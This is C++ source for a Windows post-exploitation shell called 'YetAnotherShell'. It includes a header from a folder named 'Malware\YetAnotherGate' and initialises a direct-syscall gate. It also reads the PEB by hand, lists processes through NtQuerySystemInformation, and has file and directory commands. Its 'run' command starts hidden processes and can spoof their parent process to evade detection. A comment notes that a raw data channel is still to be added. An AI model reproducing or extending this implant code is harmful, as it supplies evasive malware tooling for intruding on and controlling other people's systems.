#include "C:\Malware\YetAnotherGate\YetAnotherGate.h"
#include <windows.h>
#include <iostream>
#include <winternl.h>
#include <string>
#include <map>
#include <vector>
#include <sstream>

#pragma comment(lib, "ntdll.lib")

typedef struct _MY_SYSTEM_PROCESS_INFORMATION 
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize;
	ULONG HardFaultCount;
	ULONG NumberOfThreadsHighWatermark;
	ULONGLONG CycleTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;

//0x18 bytes (sizeof)
struct _MY_CURDIR
{
    struct _UNICODE_STRING DosPath;                                         //0x0
    VOID* Handle;                                                           //0x10
}; 

//0x448 bytes (sizeof)
struct _MY_RTL_USER_PROCESS_PARAMETERS
{
    ULONG MaximumLength;                                                    //0x0
    ULONG Length;                                                           //0x4
    ULONG Flags;                                                            //0x8
    ULONG DebugFlags;                                                       //0xc
    VOID* ConsoleHandle;                                                    //0x10
    ULONG ConsoleFlags;                                                     //0x18
    VOID* StandardInput;                                                    //0x20
    VOID* StandardOutput;                                                   //0x28
    VOID* StandardError;                                                    //0x30
    struct _MY_CURDIR CurrentDirectory;                                     //0x38
    struct _UNICODE_STRING DllPath;                                         //0x50
    struct _UNICODE_STRING ImagePathName;                                   //0x60
    struct _UNICODE_STRING CommandLine;                                     //0x70
    VOID* Environment;                                                      //0x80
    ULONG StartingX;                                                        //0x88
    ULONG StartingY;                                                        //0x8c
    ULONG CountX;                                                           //0x90
    ULONG CountY;                                                           //0x94
    ULONG CountCharsX;                                                      //0x98
    ULONG CountCharsY;                                                      //0x9c
    ULONG FillAttribute;                                                    //0xa0
    ULONG WindowFlags;                                                      //0xa4
    ULONG ShowWindowFlags;                                                  //0xa8
    struct _UNICODE_STRING WindowTitle;                                     //0xb0
    struct _UNICODE_STRING DesktopInfo;                                     //0xc0
    struct _UNICODE_STRING ShellInfo;                                       //0xd0
    struct _UNICODE_STRING RuntimeData;                                     //0xe0
    //struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];                  //0xf0
    ULONGLONG EnvironmentSize;                                              //0x3f0
    ULONGLONG EnvironmentVersion;                                           //0x3f8
    VOID* PackageDependencyData;                                            //0x400
    ULONG ProcessGroupId;                                                   //0x408
    ULONG LoaderThreads;                                                    //0x40c
    struct _UNICODE_STRING RedirectionDllName;                              //0x410
    struct _UNICODE_STRING HeapPartitionName;                               //0x420
    ULONGLONG* DefaultThreadpoolCpuSetMasks;                                //0x430
    ULONG DefaultThreadpoolCpuSetMaskCount;                                 //0x438
    ULONG DefaultThreadpoolThreadMaximum;                                   //0x43c
    ULONG HeapMemoryTypeMask;                                               //0x440
}; 

//0x7d0 bytes (sizeof)
typedef struct _MY_PEB
{
    UCHAR InheritedAddressSpace;                                            //0x0
    UCHAR ReadImageFileExecOptions;                                         //0x1
    UCHAR BeingDebugged;                                                    //0x2
    union
    {
        UCHAR BitField;                                                     //0x3
        struct
        {
            UCHAR ImageUsesLargePages:1;                                    //0x3
            UCHAR IsProtectedProcess:1;                                     //0x3
            UCHAR IsImageDynamicallyRelocated:1;                            //0x3
            UCHAR SkipPatchingUser32Forwarders:1;                           //0x3
            UCHAR IsPackagedProcess:1;                                      //0x3
            UCHAR IsAppContainer:1;                                         //0x3
            UCHAR IsProtectedProcessLight:1;                                //0x3
            UCHAR IsLongPathAwareProcess:1;                                 //0x3
        };
    };
    UCHAR Padding0[4];                                                      //0x4
    VOID* Mutant;                                                           //0x8
    VOID* ImageBaseAddress;                                                 //0x10
    struct _PEB_LDR_DATA* Ldr;                                              //0x18
    struct _MY_RTL_USER_PROCESS_PARAMETERS* ProcessParameters;              //0x20
    VOID* SubSystemData;                                                    //0x28
    VOID* ProcessHeap;                                                      //0x30
    struct _RTL_CRITICAL_SECTION* FastPebLock;                              //0x38
    union _SLIST_HEADER* volatile AtlThunkSListPtr;                         //0x40
    VOID* IFEOKey;                                                          //0x48
    union
    {
        ULONG CrossProcessFlags;                                            //0x50
        struct
        {
            ULONG ProcessInJob:1;                                           //0x50
            ULONG ProcessInitializing:1;                                    //0x50
            ULONG ProcessUsingVEH:1;                                        //0x50
            ULONG ProcessUsingVCH:1;                                        //0x50
            ULONG ProcessUsingFTH:1;                                        //0x50
            ULONG ProcessPreviouslyThrottled:1;                             //0x50
            ULONG ProcessCurrentlyThrottled:1;                              //0x50
            ULONG ProcessImagesHotPatched:1;                                //0x50
            ULONG ReservedBits0:24;                                         //0x50
        };
    };
    UCHAR Padding1[4];                                                      //0x54
    union
    {
        VOID* KernelCallbackTable;                                          //0x58
        VOID* UserSharedInfoPtr;                                            //0x58
    };
    ULONG SystemReserved;                                                   //0x60
    ULONG AtlThunkSListPtr32;                                               //0x64
    VOID* ApiSetMap;                                                        //0x68
    ULONG TlsExpansionCounter;                                              //0x70
    UCHAR Padding2[4];                                                      //0x74
    struct _RTL_BITMAP* TlsBitmap;                                          //0x78
    ULONG TlsBitmapBits[2];                                                 //0x80
    VOID* ReadOnlySharedMemoryBase;                                         //0x88
    VOID* SharedData;                                                       //0x90
    VOID** ReadOnlyStaticServerData;                                        //0x98
    VOID* AnsiCodePageData;                                                 //0xa0
    VOID* OemCodePageData;                                                  //0xa8
    VOID* UnicodeCaseTableData;                                             //0xb0
    ULONG NumberOfProcessors;                                               //0xb8
    ULONG NtGlobalFlag;                                                     //0xbc
    union _LARGE_INTEGER CriticalSectionTimeout;                            //0xc0
    ULONGLONG HeapSegmentReserve;                                           //0xc8
    ULONGLONG HeapSegmentCommit;                                            //0xd0
    ULONGLONG HeapDeCommitTotalFreeThreshold;                               //0xd8
    ULONGLONG HeapDeCommitFreeBlockThreshold;                               //0xe0
    ULONG NumberOfHeaps;                                                    //0xe8
    ULONG MaximumNumberOfHeaps;                                             //0xec
    VOID** ProcessHeaps;                                                    //0xf0
    VOID* GdiSharedHandleTable;                                             //0xf8
    VOID* ProcessStarterHelper;                                             //0x100
    ULONG GdiDCAttributeList;                                               //0x108
    UCHAR Padding3[4];                                                      //0x10c
    struct _RTL_CRITICAL_SECTION* LoaderLock;                               //0x110
    ULONG OSMajorVersion;                                                   //0x118
    ULONG OSMinorVersion;                                                   //0x11c
    USHORT OSBuildNumber;                                                   //0x120
    USHORT OSCSDVersion;                                                    //0x122
    ULONG OSPlatformId;                                                     //0x124
    ULONG ImageSubsystem;                                                   //0x128
    ULONG ImageSubsystemMajorVersion;                                       //0x12c
    ULONG ImageSubsystemMinorVersion;                                       //0x130
    UCHAR Padding4[4];                                                      //0x134
    ULONGLONG ActiveProcessAffinityMask;                                    //0x138
    ULONG GdiHandleBuffer[60];                                              //0x140
    VOID (*PostProcessInitRoutine)();                                       //0x230
    struct _RTL_BITMAP* TlsExpansionBitmap;                                 //0x238
    ULONG TlsExpansionBitmapBits[32];                                       //0x240
    ULONG SessionId;                                                        //0x2c0
    UCHAR Padding5[4];                                                      //0x2c4
    union _ULARGE_INTEGER AppCompatFlags;                                   //0x2c8
    union _ULARGE_INTEGER AppCompatFlagsUser;                               //0x2d0
    VOID* pShimData;                                                        //0x2d8
    VOID* AppCompatInfo;                                                    //0x2e0
    struct _UNICODE_STRING CSDVersion;                                      //0x2e8
    struct _ACTIVATION_CONTEXT_DATA* ActivationContextData;                 //0x2f8
    struct _ASSEMBLY_STORAGE_MAP* ProcessAssemblyStorageMap;                //0x300
    struct _ACTIVATION_CONTEXT_DATA* SystemDefaultActivationContextData;    //0x308
    struct _ASSEMBLY_STORAGE_MAP* SystemAssemblyStorageMap;                 //0x310
    ULONGLONG MinimumStackCommit;                                           //0x318
    VOID* SparePointers[2];                                                 //0x320
    VOID* PatchLoaderData;                                                  //0x330
    struct _CHPEV2_PROCESS_INFO* ChpeV2ProcessInfo;                         //0x338
    ULONG AppModelFeatureState;                                             //0x340
    ULONG SpareUlongs[2];                                                   //0x344
    USHORT ActiveCodePage;                                                  //0x34c
    USHORT OemCodePage;                                                     //0x34e
    USHORT UseCaseMapping;                                                  //0x350
    USHORT UnusedNlsField;                                                  //0x352
    VOID* WerRegistrationData;                                              //0x358
    VOID* WerShipAssertPtr;                                                 //0x360
    VOID* EcCodeBitMap;                                                     //0x368
    VOID* pImageHeaderHash;                                                 //0x370
    union
    {
        ULONG TracingFlags;                                                 //0x378
        struct
        {
            ULONG HeapTracingEnabled:1;                                     //0x378
            ULONG CritSecTracingEnabled:1;                                  //0x378
            ULONG LibLoaderTracingEnabled:1;                                //0x378
            ULONG SpareTracingBits:29;                                      //0x378
        };
    };
    UCHAR Padding6[4];                                                      //0x37c
    ULONGLONG CsrServerReadOnlySharedMemoryBase;                            //0x380
    ULONGLONG TppWorkerpListLock;                                           //0x388
    struct _LIST_ENTRY TppWorkerpList;                                      //0x390
    VOID* WaitOnAddressHashTable[128];                                      //0x3a0
    VOID* TelemetryCoverageHeader;                                          //0x7a0
    ULONG CloudFileFlags;                                                   //0x7a8
    ULONG CloudFileDiagFlags;                                               //0x7ac
    CHAR PlaceholderCompatibilityMode;                                      //0x7b0
    CHAR PlaceholderCompatibilityModeReserved[7];                           //0x7b1
    struct _LEAP_SECOND_DATA* LeapSecondData;                               //0x7b8
    union
    {
        ULONG LeapSecondFlags;                                              //0x7c0
        struct
        {
            ULONG SixtySecondEnabled:1;                                     //0x7c0
            ULONG Reserved:31;                                              //0x7c0
        };
    };
    ULONG NtGlobalFlag2;                                                    //0x7c4
    ULONGLONG ExtendedFeatureDisableMask;                                   //0x7c8
} _MY_PEB, *_MY_PPEB; 


typedef std::string (*CommandRoutine)(const std::string& args);
std::map<std::string, CommandRoutine> g_CommandMap;


std::string static ExecuteMicroShell(std::string input_command);

// --------------------------------------------------------------------------------------------

#pragma region I/O

std::string static GetCommand()
{
	std::string inputBuffer = "";
	std::getline(std::cin, inputBuffer);

	return inputBuffer;
}


void static send_output(std::string output)
{

	std::cout << output << std::endl;
}

#pragma endregion

// --------------------------------------------------------------------------------------------

#pragma region Commands

std::string static InternalCommand_LS(const std::string& args)
{

	// Default to the current directory if no path is provided
	std::string searchPath = args.empty() ? ".\\*" : args;
	
	// Format the search string correctly for the Win32 API (requires trailing wildcard)
	if(!args.empty() && args.back() != '*' && args.back() != '\\') searchPath += "\\*";
	else if(!args.empty() && args.back() == '\\') searchPath += "*";
	
	WIN32_FIND_DATAA findData;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if(hFind == INVALID_HANDLE_VALUE) return "ls: cannot access '" + args + "': No such file or directory\n";

	std::stringstream output;
	output << "\nType\tSize\t\tName\n";
	output << "------------------------------------------------\n";

	do
	{
		// Skip the current and parent directory markers to reduce noise
		std::string fileName = findData.cFileName;
		if(fileName == "." || fileName == "..") continue;

		std::string type = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "[DIR]" : "[FILE]";
		
		// Calculate exact file size (HighPart * MAXDWORD + LowPart)
		ULARGE_INTEGER fileSize;
		fileSize.LowPart = findData.nFileSizeLow;
		fileSize.HighPart = findData.nFileSizeHigh;
		
		std::string sizeStr = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "<DIR>" : std::to_string(fileSize.QuadPart);

		output << type << "\t" << sizeStr << "\t\t" << fileName << "\n";
		
	} while(FindNextFileA(hFind, &findData));

	FindClose(hFind);
	return output.str();
}

std::string static InternalCommand_CD(const std::string& args)
{

	if(args == "") return "cd requires arguments.";

	BOOL status = SetCurrentDirectoryA(args.c_str());
	if(status != TRUE) return "Error: Failed to change directory to '" + args + "'.\n";

	return "";
}

std::string static InternalCommand_WHOAMI(const std::string& args)
{
	HANDLE hToken = NULL;
	
	// Open the access token associated with the current process
	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return "Error: Failed to open process token.\n";

	// To get the required buffer size
	// This will intentionally fail with ERROR_INSUFFICIENT_BUFFER, but populate dwSize
	DWORD dwSize = 0;
	GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);

	// Allocate a dynamic buffer based on the size requested by the OS
	std::vector<BYTE> tokenBuffer(dwSize);
	PTOKEN_USER pTokenUser = (PTOKEN_USER)tokenBuffer.data();

	// Call GetTokenInformation again, this time with the properly sized buffer
	if(!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
	{
		CloseHandle(hToken);
		return "Error: Failed to extract TokenUser information.\n";
	}

	// We now have the SID. We need to translate it to Domain\User
	char userName[256];
	DWORD userNameSize = sizeof(userName);
	
	char domainName[256];
	DWORD domainNameSize = sizeof(domainName);
	
	SID_NAME_USE sidType;

	// LookupAccountSidA contacts the local SAM database or Domain Controller to resolve the SID
	if(!LookupAccountSidA(NULL, pTokenUser->User.Sid, userName, &userNameSize, domainName, &domainNameSize, &sidType))
	{
		CloseHandle(hToken);
		return "Error: Failed to resolve SID to account name.\n";
	}

	CloseHandle(hToken);
	return std::string(domainName) + "\\" + std::string(userName) + "\n";
}

std::string static InternalCommand_PS(const std::string& args)
{

	std::stringstream output;

	ULONG bufferSize = 1024 * 1024; 
	PVOID buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if(buffer == NULL)
	{
		return "Error: Initial VirtualAlloc failed.\n";
	}

	NTSTATUS status;
	while(true)
	{
		status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
		
		if(status == 0xC0000004)
		{
			VirtualFree(buffer, 0, MEM_RELEASE);
			bufferSize += (1024 * 1024); // Add another 1MB and try again
			buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if(buffer == NULL)
			{
				return "Error: Reallocation VirtualAlloc failed.\n";
			}
		}

		else break;
	}

	if(!NT_SUCCESS(status))
	{
		output << "Error: NtQuerySystemInformation failed with status " << std::hex << status << "\n";

		if(buffer != NULL) VirtualFree(buffer, 0, MEM_RELEASE);
		return output.str();
	}


	PMY_SYSTEM_PROCESS_INFORMATION pInfo = (PMY_SYSTEM_PROCESS_INFORMATION)buffer;
		
	output << "PID\tPPID\tName\n";
	output << "----------------------------------------\n";

	while(true)
	{
		DWORD pid = (DWORD)(ULONG_PTR)pInfo->UniqueProcessId;
		DWORD ppid = (DWORD)(ULONG_PTR)pInfo->InheritedFromUniqueProcessId;
			
		std::string procName = "[System or Unknown]";
		
		if(pInfo->ImageName.Buffer != NULL)
		{
			int size_needed = WideCharToMultiByte(CP_UTF8, 0, pInfo->ImageName.Buffer, (int)(pInfo->ImageName.Length / sizeof(WCHAR)), NULL, 0, NULL, NULL);
			std::string convertedName(size_needed, 0);
			WideCharToMultiByte(CP_UTF8, 0, pInfo->ImageName.Buffer, (int)(pInfo->ImageName.Length / sizeof(WCHAR)), &convertedName[0], size_needed, NULL, NULL);
			
			procName = convertedName;
		}

		output << pid << "\t" << ppid << "\t" << procName << "\n";

		if(pInfo->NextEntryOffset == 0)
		{
			break;
		}
			
		pInfo = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pInfo + pInfo->NextEntryOffset);
	}


	VirtualFree(buffer, 0, MEM_RELEASE);
	return output.str();

}

std::string static InternalCommand_MKDIR(const std::string& args)
{
	if(args.empty()) return "Error: mkdir requires a directory name.\n";

	if(CreateDirectoryA(args.c_str(), nullptr)) return "Directory created: " + args + "\n";
	
	return "Error: Failed to create directory. Code: " + std::to_string(GetLastError()) + "\n";
}

std::string static InternalCommand_RM(const std::string& args)
{
	if(args.empty()) return "Error: rm requires a file name.\n";

	if(DeleteFileA(args.c_str())) return "File deleted: " + args + "\n";
	
	return "Error: Failed to delete file. Code: " + std::to_string(GetLastError()) + "\n";
}

std::string static InternalCommand_EXEC(const std::string& args)
{
	if(args.empty()) return "Error: exec requires a target executable.\n";

	std::string command = args;
	DWORD targetPid = 0;

	// Parse arguments to see if a PID was provided at the end
	size_t lastSpace = args.find_last_of(' ');
	if(lastSpace != std::string::npos)
	{
		std::string possiblePid = args.substr(lastSpace + 1);
		bool isNumeric = true;
		
		// Verify every character in the last token is a digit
		for(char c : possiblePid)
		{
			if(!isdigit(c))
			{
				isNumeric = false;
				break;
			}
		}

		if(isNumeric && !possiblePid.empty())
		{
			targetPid = std::stoul(possiblePid);
			command = args.substr(0, lastSpace);
			
			// Clean up any trailing whitespace from the command string
			command.erase(command.find_last_not_of(" \n\r\t") + 1);
		}
	}

	// Safely copy the command string into a writable buffer for the Windows API
	std::vector<char> cmdline(command.begin(), command.end());
	cmdline.push_back('\0');

	if(targetPid == 0)
	{
		// --- NORMAL CREATION ---
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;
		
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		if(CreateProcessA(NULL, cmdline.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
		{
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			return "[+] Process started normally: '" + command + "'\n";
		}
		else return "[-] Error: Normal execution failed. Code: " + std::to_string(GetLastError()) + "\n";
	}
	else
	{
		// --- SPOOFED CREATION (PID provided) ---
		HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetPid);
		if(hParent == NULL) return "[-] Error: Failed to open Parent PID " + std::to_string(targetPid) + ". Code: " + std::to_string(GetLastError()) + "\n";

		SIZE_T attributeSize = 0;
		InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);

		PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
		if(pAttributeList == NULL)
		{
			CloseHandle(hParent);
			return "[-] Error: Failed to allocate Attribute List.\n";
		}

		if(!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &attributeSize))
		{
			HeapFree(GetProcessHeap(), 0, pAttributeList);
			CloseHandle(hParent);
			return "[-] Error: Failed to initialize Attribute List.\n";
		}

		if(!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL))
		{
			DeleteProcThreadAttributeList(pAttributeList);
			HeapFree(GetProcessHeap(), 0, pAttributeList);
			CloseHandle(hParent);
			return "[-] Error: Failed to update Attribute List.\n";
		}

		STARTUPINFOEXA siex;
		PROCESS_INFORMATION pi;
		
		ZeroMemory(&siex, sizeof(siex));
		siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
		siex.lpAttributeList = pAttributeList;
		ZeroMemory(&pi, sizeof(pi));

		BOOL success = CreateProcessA(NULL, cmdline.data(), NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &siex.StartupInfo, &pi);

		DeleteProcThreadAttributeList(pAttributeList);
		HeapFree(GetProcessHeap(), 0, pAttributeList);
		CloseHandle(hParent);

		if(success)
		{
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			return "[+] Process spoofed successfully: '" + command + "' as child of PID " + std::to_string(targetPid) + "\n";
		}
		else return "[-] Error: Spoofed execution failed. Code: " + std::to_string(GetLastError()) + "\n";
	}
}

std::string static InternalCommand_RMDIR(const std::string& args)
{
	if(args.empty()) return "Error: rmdir requires a directory name.\n";

	if(RemoveDirectoryA(args.c_str())) return "Directory removed: " + args + "\n";
	
	return "Error: Failed to remove directory. Code: " + std::to_string(GetLastError()) + "\n";
}


void static InitializeMicroShell()
{
	g_CommandMap["ls"] = InternalCommand_LS;
	g_CommandMap["dir"] = InternalCommand_LS;
	g_CommandMap["cd"] = InternalCommand_CD;
	g_CommandMap["ps"] = InternalCommand_PS;
	g_CommandMap["whoami"] = InternalCommand_WHOAMI;
	g_CommandMap["mkdir"] = InternalCommand_MKDIR;
	g_CommandMap["rmdir"] = InternalCommand_RMDIR;
	g_CommandMap["rm"] = InternalCommand_RM;
	g_CommandMap["run"] = InternalCommand_EXEC;
	// to add: something to send and get raw data
}

#pragma endregion

// --------------------------------------------------------------------------------------------

static std::wstring Custom_GetCurrentDirectoryW()
{
	#ifdef _WIN64
		_MY_PPEB pPeb = (_MY_PPEB)__readgsqword(0x60);
	#else
		PPEB _MY_PPEB = (_MY_PPEB)__readfsdword(0x30);
	#endif

    if (pPeb && pPeb->ProcessParameters)
    {
        PWSTR buffer = pPeb->ProcessParameters->CurrentDirectory.DosPath.Buffer;
        USHORT length = pPeb->ProcessParameters->CurrentDirectory.DosPath.Length;

        if (buffer && length > 0) return std::wstring(buffer, length / sizeof(WCHAR));
    }

    return std::wstring();
}


int main()
{
	InitializeMicroShell();


	size_t numSyscalls = 0;
    Sys_stb syscallEntries[MAX_SYSCALLS];

    syscallEntries[numSyscalls++] = {"RtlGetCurrentDirectory_U", 0, 0, nullptr, nullptr};

    InitSyscallGate(syscallEntries, numSyscalls);



	while(true)
	{
		std::wstring currentPath = Custom_GetCurrentDirectoryW();

		if (!currentPath.empty()) std::wcout << L"[YetAnotherShell] " << currentPath << L"> ";
		else std::wcout << L"[YetAnotherShell]> ";


		std::string recieved_command = GetCommand();
		if(recieved_command.empty()) continue;
		
		
		if(recieved_command == "exit" || recieved_command == "quit") break;

		std::string output = ExecuteMicroShell(recieved_command);
		send_output(output);
	}

	return 0;
}


std::string static ExecuteMicroShell(std::string input_command)
{
	if(input_command.empty()) return "";

	size_t spacePos = input_command.find(' ');
	std::string command = input_command.substr(0, spacePos);
	std::string args = "";
	
	if(spacePos != std::string::npos) args = input_command.substr(spacePos + 1);

	// Strip trailing whitespace, newlines, and carriage returns
	command.erase(command.find_last_not_of(" \n\r\t") + 1);
	if(!args.empty()) args.erase(args.find_last_not_of(" \n\r\t") + 1);

	// Dispatch execution
	if(g_CommandMap.find(command) != g_CommandMap.end()) return g_CommandMap[command](args);
	else return "YetAnotherShell Error: Unrecognized internal command '" + command + "'.\n";
}